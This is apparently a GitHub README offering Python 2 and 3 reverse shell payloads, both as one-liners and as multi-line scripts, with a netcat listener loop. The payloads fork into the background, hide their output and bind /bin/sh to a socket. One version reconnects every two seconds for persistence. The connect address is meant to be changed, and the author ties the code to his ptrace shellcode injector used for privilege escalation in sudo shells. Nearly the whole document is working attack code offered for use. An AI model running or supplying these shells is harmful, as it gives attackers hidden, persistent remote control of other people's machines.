# python 2 & 3 reverse shell one liner detached (background) By David Reguera Garcia aka Dreg

just change **connect(("127.0.0.1",9999))**

## Simple reverse shell
```
python -c 'exec("""\nimport socket,subprocess,os,sys\n\npidrg = os.fork()\nif pidrg > 0:\n        sys.exit(0)\n\nos.chdir("/")\n\nos.setsid()\n\nos.umask(0)\n\ndrgpid = os.fork()\nif drgpid > 0:\n        sys.exit(0)\n\nsys.stdout.flush()\n\nsys.stderr.flush()\n\nfdreg = open("/dev/null", "w")\n\nsys.stdout = fdreg\n\nsys.stderr = fdreg\n\nsdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\nsdregs.connect(("127.0.0.1",9999))\n\nos.dup2(sdregs.fileno(),0)\n\nos.dup2(sdregs.fileno(),1)\n\nos.dup2(sdregs.fileno(),2)\n\np=subprocess.call(["/bin/sh","-i"])\n""")'
```

## Infinite loop reverse shell each 2 seconds:
```
 python -c 'exec("""\nimport socket,subprocess,os,sys, time\n\npidrg = os.fork()\nif pidrg > 0:\n        sys.exit(0)\n\nos.chdir("/")\nos.setsid()\nos.umask(0)\ndrgpid = os.fork()\nif drgpid > 0:\n        sys.exit(0)\n\nwhile 1:\n        try:\n                sys.stdout.flush()\n\n                sys.stderr.flush()\n\n                fdreg = open("/dev/null", "w")\n\n                sys.stdout = fdreg\n\n                sys.stderr = fdreg\n\n                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\n                sdregs.connect(("127.0.0.1",9999))\n\n                os.dup2(sdregs.fileno(),0)\n\n                os.dup2(sdregs.fileno(),1)\n\n                os.dup2(sdregs.fileno(),2)\n\n                p=subprocess.call(["/bin/sh","-i"])\n\n                sdregs.close()\n\n        except Exception:\n                pass\n\n        time.sleep(2)\n""")'
```

Just wait for reverse shell with a nc
```
while true; do nc -lvp 9999; done
```

I made this for my shellcode injector in sudo shells via ptrace:

https://github.com/David-Reguera-Garcia-Dreg/drx_ptrace_shellcode_injector

https://github.com/David-Reguera-Garcia-Dreg/ptrace_misconfiguration_local_privilege_escalation

https://github.com/David-Reguera-Garcia-Dreg/

http://www.fr33project.org

dreg@fr33project.org

## multi line code

### Simple reverse shell 

```
#!/usr/bin/env python

# David Reguera Garcia aka Dreg
# https://github.com/David-Reguera-Garcia-Dreg/
# http://www.fr33project.org
# dreg@fr33project.org

import socket,subprocess,os,sys

pidrg = os.fork()
if pidrg > 0:
	sys.exit(0)

os.chdir("/")

os.setsid()

os.umask(0)

drgpid = os.fork()
if drgpid > 0:
	sys.exit(0)

sys.stdout.flush()

sys.stderr.flush()

fdreg = open("/dev/null", "w")

sys.stdout = fdreg

sys.stderr = fdreg

sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

sdregs.connect(("127.0.0.1",9999))

os.dup2(sdregs.fileno(),0)

os.dup2(sdregs.fileno(),1)

os.dup2(sdregs.fileno(),2)

p=subprocess.call(["/bin/sh","-i"])
```

### Infinite loop reverse shell each 2 seconds

```
#!/usr/bin/env python

# David Reguera Garcia aka Dreg
# https://github.com/David-Reguera-Garcia-Dreg/
# http://www.fr33project.org
# dreg@fr33project.org

import socket,subprocess,os,sys, time

pidrg = os.fork()
if pidrg > 0:
        sys.exit(0)

os.chdir("/")
os.setsid()
os.umask(0)
drgpid = os.fork()
if drgpid > 0:
        sys.exit(0)

while 1:
        try:
                sys.stdout.flush()

                sys.stderr.flush()

                fdreg = open("/dev/null", "w")

                sys.stdout = fdreg

                sys.stderr = fdreg

                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

                sdregs.connect(("127.0.0.1",9999))

                os.dup2(sdregs.fileno(),0)

                os.dup2(sdregs.fileno(),1)

                os.dup2(sdregs.fileno(),2)

                p=subprocess.call(["/bin/sh","-i"])

                sdregs.close()

        except Exception:
                pass

        time.sleep(2)
```

http://jagt.github.io/python-single-line-convert/
